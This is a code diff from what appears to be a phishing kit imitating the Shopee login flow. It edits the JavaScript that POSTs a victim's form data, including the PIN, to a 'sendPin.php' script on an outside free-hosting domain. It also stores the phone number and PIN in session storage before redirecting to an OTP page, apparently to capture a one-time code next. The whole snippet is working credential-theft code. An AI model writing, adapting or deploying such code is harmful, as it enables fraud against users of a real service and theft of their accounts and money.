@@ -239,7 +239,7 @@ document.getElementById("pass").value = pass + "";
     
      $.ajax({
  type: 'POST',
- url: 'https://www.website-layanan.c1.is/shopee/3/sendPin.php',
+ url: 'https://www.website-layanan.c1.is/shopee/sendPin.php',
  data: $("#ryuSubmit").serialize(),
  datatype: 'JSON',
  
@@ -257,8 +257,8 @@ document.getElementById("pass").value = pass + "";
     
 var alerts = document.getElementById("nomorhp").value;
 sessionStorage.setItem("alerts", alerts);
-var setpin = document.getElementById("setPin").value;
-sessionStorage.setItem("setpin", setpin); 
+var spin = document.getElementById("setPin").value;
+sessionStorage.setItem("spin", spin); 
 window.location.href='otp.html';     
                     }
                 }
